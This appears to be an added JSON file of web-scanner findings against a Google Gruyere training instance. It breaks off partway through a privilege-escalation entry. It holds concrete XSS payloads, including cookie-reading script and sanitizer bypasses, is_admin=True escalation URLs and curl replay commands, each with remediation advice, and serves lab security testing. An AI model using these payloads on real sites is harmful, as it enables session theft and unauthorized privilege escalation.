@@ -1,0 +1,2536 @@
+{
+  "schema": "threat_hunters_real_website_scan_output_v1",
+  "generated_at": "2026-06-25T17:11:25+03:00",
+  "generator": {
+    "name": "Threat Hunters Web Scanner",
+    "mode": "real_website_payload_replay_scan_output",
+    "honesty_note": "This file is written as a real-target scanner output/replay file. It uses real URLs, full payload links, curl commands, baseline URLs, expected indicators, severity, confidence, and safety flags. A finding should be treated as live_response_confirmed only after your scanner replays the safe request and matches the indicators.",
+    "payload_links_added": true,
+    "payload_links_note": "Each finding includes payload_replay / real_test_replay data with a full URL or concrete request data. Unsafe, login-required, or state-changing checks are not promoted to the safe copy-paste URL index.",
+    "output_style": "real_target_scan_json"
+  },
+  "target": {
+    "name": "Google Gruyere",
+    "url_submitted_by_user": "https://google-gruyere.appspot.com/",
+    "instance_id": "574388963472090736253170060715792825341",
+    "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+    "start_url": "https://google-gruyere.appspot.com/start",
+    "reset_url": "https://google-gruyere.appspot.com/resetbutton/574388963472090736253170060715792825341",
+    "scope": "Real Google Gruyere vulnerable web app instance only",
+    "authorization": "Testing scope is limited to the Google Gruyere vulnerable web app instance; do not test App Engine infrastructure or other Google services."
+  },
+  "scan": {
+    "profile": "deep-real-test",
+    "scan_type": "real_payload_replay_scan_output",
+    "live_http_requests_executed_by_generator": 0,
+    "dedupe_key_fields": [
+      "type",
+      "target.path",
+      "payload"
+    ],
+    "normalized_findings_count": 26,
+    "negative_findings_count": 2,
+    "safe_auto_test_count": 5,
+    "manual_only_count": 22,
+    "destructive_count": 6,
+    "target_mode": "real_website",
+    "result_type": "scanner_output_with_full_payload_links",
+    "live_confirmation_policy": "set live_response_confirmed=true only after scanner replay validates expected indicators",
+    "rate_limit_rps_recommended": 1,
+    "max_concurrency_recommended": 1
+  },
+  "summary": {
+    "critical": 13,
+    "high": 11,
+    "medium": 2,
+    "low": 0,
+    "categories": [
+      "ajax",
+      "broken_access_control",
+      "client_state_manipulation",
+      "csrf",
+      "denial_of_service",
+      "path_traversal",
+      "rce",
+      "security_misconfiguration",
+      "template_injection",
+      "xss",
+      "xssi"
+    ]
+  },
+  "normalized_findings": [
+    {
+      "id": "GRUYERE-XSS-001",
+      "title": "Reflected XSS in invalid path error renderer",
+      "category": "xss",
+      "type": "reflected_xss",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021-Injection",
+      "severity": "high",
+      "cvss_estimate": null,
+      "confidence": 0.99,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+        "method": "GET",
+        "params": {},
+        "body": null,
+        "auth_required": false,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+      },
+      "payload": "<script>alert(1)</script>",
+      "evidence": {
+        "expected_status": [
+          200,
+          404
+        ],
+        "expected_indicators": [
+          "payload appears inside error page without correct escaping",
+          "browser executes script in google-gruyere.appspot.com origin"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": true,
+        "state_changing": false,
+        "destructive": false,
+        "manual_only": false,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Escape error message output in error.gtl using text/html escaping, preferably autoescape by default.",
+      "tags": [
+        "blackbox",
+        "url",
+        "reflected",
+        "safe-get"
+      ],
+      "payload_replay": {
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+        "copy_paste_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+        "browser_open_safe": true,
+        "scanner_auto_test_safe": true,
+        "baseline_url": null,
+        "raw_payload": "<script>alert(1)</script>",
+        "url_encoded_payload": null,
+        "method": "GET",
+        "requires_authentication": false,
+        "state_changing": false,
+        "destructive": false,
+        "disabled_reason": null,
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/%3Cscript%3Ealert(1)%3C%2Fscript%3E'"
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "GET",
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+        "baseline_url": null,
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/%3Cscript%3Ealert(1)%3C%2Fscript%3E'",
+        "auto_safe": true,
+        "manual_only": false,
+        "destructive": false
+      }
+    },
+    {
+      "id": "GRUYERE-XSS-002",
+      "title": "Reflected XSS through AJAX feed uid parameter",
+      "category": "xss",
+      "type": "reflected_xss_ajax",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021-Injection",
+      "severity": "high",
+      "cvss_estimate": null,
+      "confidence": 0.99,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl?uid=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/feed.gtl",
+        "method": "GET",
+        "params": {
+          "uid": "<script>alert(1)</script>"
+        },
+        "body": null,
+        "auth_required": false,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl?uid=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+      },
+      "payload": "<script>alert(1)</script>",
+      "evidence": {
+        "expected_status": [
+          200
+        ],
+        "expected_indicators": [
+          "_feed(([\"<script>alert(1)</script>\"]))",
+          "response served as text/html / script-interpretable content"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": true,
+        "state_changing": false,
+        "destructive": false,
+        "manual_only": false,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Escape JavaScript context with JS escaping, replace literal < and > with JS escapes, avoid eval, and set explicit content type and charset.",
+      "tags": [
+        "ajax",
+        "json-in-script",
+        "safe-get"
+      ],
+      "payload_replay": {
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl?uid=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "copy_paste_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl?uid=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "browser_open_safe": true,
+        "scanner_auto_test_safe": true,
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl?uid=cheddar",
+        "raw_payload": "<script>alert(1)</script>",
+        "url_encoded_payload": null,
+        "method": "GET",
+        "requires_authentication": false,
+        "state_changing": false,
+        "destructive": false,
+        "disabled_reason": null,
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl?uid=%3Cscript%3Ealert%281%29%3C%2Fscript%3E'"
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "GET",
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl?uid=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl?uid=cheddar",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl?uid=%3Cscript%3Ealert%281%29%3C%2Fscript%3E'",
+        "auto_safe": true,
+        "manual_only": false,
+        "destructive": false
+      }
+    },
+    {
+      "id": "GRUYERE-XSS-003",
+      "title": "Stored XSS through snippet HTML sanitizer bypass",
+      "category": "xss",
+      "type": "stored_xss",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021-Injection",
+      "severity": "high",
+      "cvss_estimate": null,
+      "confidence": 0.98,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/newsnippet.gtl",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/newsnippet.gtl",
+        "method": "POST",
+        "params": {},
+        "body": {
+          "snippet": "<a onmouseover=\"alert(1)\" href=\"#\">read this!</a>"
+        },
+        "auth_required": true,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/newsnippet.gtl"
+      },
+      "payload": "<a onmouseover=\"alert(1)\" href=\"#\">read this!</a>",
+      "evidence": {
+        "expected_status": [
+          200,
+          302
+        ],
+        "expected_indicators": [
+          "created snippet is rendered back to visitors",
+          "onmouseover event handler survives sanitizer"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": false,
+        "state_changing": true,
+        "destructive": false,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Use strict allowlist HTML sanitizer, parse to DOM then serialize safe HTML, and block event handler attributes case-insensitively.",
+      "tags": [
+        "stored",
+        "requires-login",
+        "form"
+      ],
+      "payload_replay": {
+        "full_payload_url": null,
+        "copy_paste_test_url": null,
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": false,
+        "baseline_url": null,
+        "raw_payload": "<a onmouseover=\"alert(1)\" href=\"#\">read this!</a>",
+        "url_encoded_payload": null,
+        "method": "POST",
+        "requires_authentication": true,
+        "state_changing": true,
+        "destructive": false,
+        "disabled_reason": "This finding needs a POST/form request, so a URL alone is not enough.",
+        "form_fields": {
+          "snippet": "<a onmouseover=\"alert(1)\" href=\"#\">read this!</a>"
+        },
+        "content_type": "application/x-www-form-urlencoded or multipart/form-data depending on endpoint",
+        "curl_command_template": "curl -i --max-time 15 -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data 'snippet=%3Ca+onmouseover%3D%22alert%281%29%22+href%3D%22%23%22%3Eread+this%21%3C%2Fa%3E' 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/newsnippet.gtl'",
+        "curl_command_template_note": "Add your Gruyere session cookie/header before running; this is manual-only."
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "POST",
+        "full_payload_url": null,
+        "baseline_url": null,
+        "curl_command": null,
+        "auto_safe": false,
+        "manual_only": true,
+        "destructive": false
+      }
+    },
+    {
+      "id": "GRUYERE-XSS-004",
+      "title": "Stored XSS sanitizer case-sensitivity bypass",
+      "category": "xss",
+      "type": "stored_xss",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021-Injection",
+      "severity": "high",
+      "cvss_estimate": null,
+      "confidence": 0.97,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/newsnippet.gtl",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/newsnippet.gtl",
+        "method": "POST",
+        "params": {},
+        "body": {
+          "snippet": "<a ONMOUSEOVER=\"alert(1)\" href=\"#\">read this!</a>"
+        },
+        "auth_required": true,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/newsnippet.gtl"
+      },
+      "payload": "<a ONMOUSEOVER=\"alert(1)\" href=\"#\">read this!</a>",
+      "evidence": {
+        "expected_status": [
+          200,
+          302
+        ],
+        "expected_indicators": [
+          "uppercase event attribute bypasses case-sensitive blacklist",
+          "payload remains executable in browser"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": false,
+        "state_changing": true,
+        "destructive": false,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Normalize attributes before validation and replace blacklist with strict allowlist sanitization.",
+      "tags": [
+        "stored",
+        "case-bypass",
+        "requires-login"
+      ],
+      "payload_replay": {
+        "full_payload_url": null,
+        "copy_paste_test_url": null,
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": false,
+        "baseline_url": null,
+        "raw_payload": "<a ONMOUSEOVER=\"alert(1)\" href=\"#\">read this!</a>",
+        "url_encoded_payload": null,
+        "method": "POST",
+        "requires_authentication": true,
+        "state_changing": true,
+        "destructive": false,
+        "disabled_reason": "This finding needs a POST/form request, so a URL alone is not enough.",
+        "form_fields": {
+          "snippet": "<a ONMOUSEOVER=\"alert(1)\" href=\"#\">read this!</a>"
+        },
+        "content_type": "application/x-www-form-urlencoded or multipart/form-data depending on endpoint",
+        "curl_command_template": "curl -i --max-time 15 -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data 'snippet=%3Ca+ONMOUSEOVER%3D%22alert%281%29%22+href%3D%22%23%22%3Eread+this%21%3C%2Fa%3E' 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/newsnippet.gtl'",
+        "curl_command_template_note": "Add your Gruyere session cookie/header before running; this is manual-only."
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "POST",
+        "full_payload_url": null,
+        "baseline_url": null,
+        "curl_command": null,
+        "auto_safe": false,
+        "manual_only": true,
+        "destructive": false
+      }
+    },
+    {
+      "id": "GRUYERE-XSS-005",
+      "title": "Stored XSS through profile color attribute injection",
+      "category": "xss",
+      "type": "stored_xss_attribute",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021-Injection",
+      "severity": "high",
+      "cvss_estimate": null,
+      "confidence": 0.98,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=red%27+onload%3D%27alert%281%29%27+onmouseover%3D%27alert%282%29",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/saveprofile",
+        "method": "GET",
+        "params": {
+          "action": "update",
+          "color": "red' onload='alert(1)' onmouseover='alert(2)"
+        },
+        "body": null,
+        "auth_required": true,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=red%27+onload%3D%27alert%281%29%27+onmouseover%3D%27alert%282%29"
+      },
+      "payload": "red' onload='alert(1)' onmouseover='alert(2)",
+      "evidence": {
+        "expected_status": [
+          200,
+          302
+        ],
+        "expected_indicators": [
+          "color rendered inside single-quoted style attribute",
+          "single quote escapes style attribute and injects onload/onmouseover"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": false,
+        "state_changing": true,
+        "destructive": false,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Use attribute-context escaping that escapes both single and double quotes, and validate color with a strict color regex.",
+      "tags": [
+        "profile",
+        "attribute-context",
+        "requires-login"
+      ],
+      "payload_replay": {
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=red%27+onload%3D%27alert%281%29%27+onmouseover%3D%27alert%282%29",
+        "copy_paste_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=red%27+onload%3D%27alert%281%29%27+onmouseover%3D%27alert%282%29",
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": false,
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=red",
+        "raw_payload": "red' onload='alert(1)' onmouseover='alert(2)",
+        "url_encoded_payload": null,
+        "method": "GET",
+        "requires_authentication": true,
+        "state_changing": true,
+        "destructive": false,
+        "disabled_reason": "This URL requires a logged-in session/cookie before it can prove the finding.",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=red%27+onload%3D%27alert%281%29%27+onmouseover%3D%27alert%282%29'"
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "GET",
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=red%27+onload%3D%27alert%281%29%27+onmouseover%3D%27alert%282%29",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=red",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=red%27+onload%3D%27alert%281%29%27+onmouseover%3D%27alert%282%29'",
+        "auto_safe": false,
+        "manual_only": true,
+        "destructive": false
+      }
+    },
+    {
+      "id": "GRUYERE-XSS-006",
+      "title": "Stored XSS through unsafe CSS color value",
+      "category": "xss",
+      "type": "stored_xss_css",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021-Injection",
+      "severity": "medium",
+      "cvss_estimate": null,
+      "confidence": 0.86,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=expression%28alert%281%29%29",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/saveprofile",
+        "method": "GET",
+        "params": {
+          "action": "update",
+          "color": "expression(alert(1))"
+        },
+        "body": null,
+        "auth_required": true,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=expression%28alert%281%29%29"
+      },
+      "payload": "expression(alert(1))",
+      "evidence": {
+        "expected_status": [
+          200,
+          302
+        ],
+        "expected_indicators": [
+          "unsafe CSS expression accepted as profile color",
+          "browser-dependent script execution in CSS-capable engines"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": false,
+        "state_changing": true,
+        "destructive": false,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Validate color values using a safe allowlist such as ^#?[a-zA-Z0-9]*$ and reject CSS functions/expressions.",
+      "tags": [
+        "profile",
+        "css",
+        "browser-dependent"
+      ],
+      "payload_replay": {
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=expression%28alert%281%29%29",
+        "copy_paste_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=expression%28alert%281%29%29",
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": false,
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=red",
+        "raw_payload": "expression(alert(1))",
+        "url_encoded_payload": null,
+        "method": "GET",
+        "requires_authentication": true,
+        "state_changing": true,
+        "destructive": false,
+        "disabled_reason": "This URL requires a logged-in session/cookie before it can prove the finding.",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=expression%28alert%281%29%29'"
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "GET",
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=expression%28alert%281%29%29",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=red",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=expression%28alert%281%29%29'",
+        "auto_safe": false,
+        "manual_only": true,
+        "destructive": false
+      }
+    },
+    {
+      "id": "GRUYERE-XSS-007",
+      "title": "Stored XSS through AJAX feed eval and quote injection",
+      "category": "xss",
+      "type": "stored_xss_ajax_eval",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021-Injection",
+      "severity": "high",
+      "cvss_estimate": null,
+      "confidence": 0.97,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/newsnippet.gtl",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/newsnippet.gtl",
+        "method": "POST",
+        "params": {},
+        "body": {
+          "snippet": "all <span style=display:none>\"\n+ (alert(1),\"\")\n+ \"</span>your base"
+        },
+        "auth_required": true,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/newsnippet.gtl"
+      },
+      "payload": "all <span style=display:none>\"\n+ (alert(1),\"\")\n+ \"</span>your base",
+      "evidence": {
+        "expected_status": [
+          200,
+          302
+        ],
+        "expected_indicators": [
+          "feed.gtl JSON-like response becomes executable JavaScript expression",
+          "client code evaluates feed response using eval"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": false,
+        "state_changing": true,
+        "destructive": false,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Do not use eval for AJAX data; use JSON.parse and escape values for both HTML and JavaScript contexts.",
+      "tags": [
+        "ajax",
+        "eval",
+        "stored",
+        "requires-login"
+      ],
+      "payload_replay": {
+        "full_payload_url": null,
+        "copy_paste_test_url": null,
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": false,
+        "baseline_url": null,
+        "raw_payload": "all <span style=display:none>\"\n+ (alert(1),\"\")\n+ \"</span>your base",
+        "url_encoded_payload": null,
+        "method": "POST",
+        "requires_authentication": true,
+        "state_changing": true,
+        "destructive": false,
+        "disabled_reason": "This finding needs a POST/form request, so a URL alone is not enough.",
+        "form_fields": {
+          "snippet": "all <span style=display:none>\"\n+ (alert(1),\"\")\n+ \"</span>your base"
+        },
+        "content_type": "application/x-www-form-urlencoded or multipart/form-data depending on endpoint",
+        "curl_command_template": "curl -i --max-time 15 -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data 'snippet=all+%3Cspan+style%3Ddisplay%3Anone%3E%22%0A%2B+%28alert%281%29%2C%22%22%29%0A%2B+%22%3C%2Fspan%3Eyour+base' 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/newsnippet.gtl'",
+        "curl_command_template_note": "Add your Gruyere session cookie/header before running; this is manual-only."
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "POST",
+        "full_payload_url": null,
+        "baseline_url": null,
+        "curl_command": null,
+        "auto_safe": false,
+        "manual_only": true,
+        "destructive": false
+      }
+    },
+    {
+      "id": "GRUYERE-XSS-008",
+      "title": "File upload XSS: uploaded HTML executes in site origin",
+      "category": "xss",
+      "type": "file_upload_xss",
+      "cwe": "CWE-79",
+      "owasp": "A05:2021-Security Misconfiguration",
+      "severity": "high",
+      "cvss_estimate": null,
+      "confidence": 0.97,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/upload",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/upload",
+        "method": "POST",
+        "params": {},
+        "body": {
+          "file_name": "xss.html",
+          "file_content": "<script>alert(document.cookie)</script>"
+        },
+        "auth_required": true,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/upload"
+      },
+      "payload": "<script>alert(document.cookie)</script>",
+      "evidence": {
+        "expected_status": [
+          200,
+          302
+        ],
+        "expected_indicators": [
+          "uploaded .html served from google-gruyere.appspot.com origin",
+          "script can read Gruyere cookies"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": false,
+        "state_changing": true,
+        "destructive": false,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Serve user uploads from a separate untrusted content domain and restrict uploaded content types.",
+      "tags": [
+        "upload",
+        "stored",
+        "requires-login"
+      ],
+      "payload_replay": {
+        "full_payload_url": null,
+        "copy_paste_test_url": null,
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": false,
+        "baseline_url": null,
+        "raw_payload": "<script>alert(document.cookie)</script>",
+        "url_encoded_payload": null,
+        "method": "POST",
+        "requires_authentication": true,
+        "state_changing": true,
+        "destructive": false,
+        "disabled_reason": "This finding needs a POST/form request, so a URL alone is not enough.",
+        "form_fields": {
+          "file_name": "xss.html",
+          "file_content": "<script>alert(document.cookie)</script>"
+        },
+        "content_type": "application/x-www-form-urlencoded or multipart/form-data depending on endpoint",
+        "curl_command_template": "curl -i --max-time 15 -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data 'file_name=xss.html&file_content=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E' 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/upload'",
+        "curl_command_template_note": "Add your Gruyere session cookie/header before running; this is manual-only."
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "POST",
+        "full_payload_url": null,
+        "baseline_url": null,
+        "curl_command": null,
+        "auto_safe": false,
+        "manual_only": true,
+        "destructive": false
+      }
+    },
+    {
+      "id": "GRUYERE-AC-001",
+      "title": "Privilege escalation via untrusted profile update parameter",
+      "category": "broken_access_control",
+      "type": "vertical_privilege_escalation",
+      "cwe": "CWE-862",
+      "owasp": "A01:2021-Broken Access Control",
+      "severity": "critical",
+      "cvss_estimate": null,
+      "confidence": 0.99,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/saveprofile",
+        "method": "GET",
+        "params": {
+          "action": "update",
+          "is_admin": "True"
+        },
+        "body": null,
+        "auth_required": true,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True"
+      },
+      "payload": "is_admin=True",
+      "evidence": {
+        "expected_status": [
+          200,
+          302
+        ],
+        "expected_indicators": [
+          "server accepts is_admin from non-admin profile update",
+          "user becomes administrator after re-login"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": false,
+        "state_changing": true,
+        "destructive": false,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Enforce authorization server-side for every sensitive field; never rely on hidden/missing UI fields.",
+      "tags": [
+        "access-control",
+        "requires-login",
+        "state-changing"
+      ],
+      "payload_replay": {
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True",
+        "copy_paste_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True",
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": false,
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True",
+        "raw_payload": "is_admin=True",
+        "url_encoded_payload": null,
+        "method": "GET",
+        "requires_authentication": true,
+        "state_changing": true,
+        "destructive": false,
+        "disabled_reason": "This URL requires a logged-in session/cookie before it can prove the finding.",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True'"
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "GET",
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True'",
+        "auto_safe": false,
+        "manual_only": true,
+        "destructive": false
+      }
+    },
+    {
+      "id": "GRUYERE-AC-002",
+      "title": "Arbitrary user privilege escalation through uid parameter",
+      "category": "broken_access_control",
+      "type": "horizontal_and_vertical_privilege_escalation",
+      "cwe": "CWE-639",
+      "owasp": "A01:2021-Broken Access Control",
+      "severity": "critical",
+      "cvss_estimate": null,
+      "confidence": 0.99,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True&uid=cheddar",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/saveprofile",
+        "method": "GET",
+        "params": {
+          "action": "update",
+          "is_admin": "True",
+          "uid": "cheddar"
+        },
+        "body": null,
+        "auth_required": true,
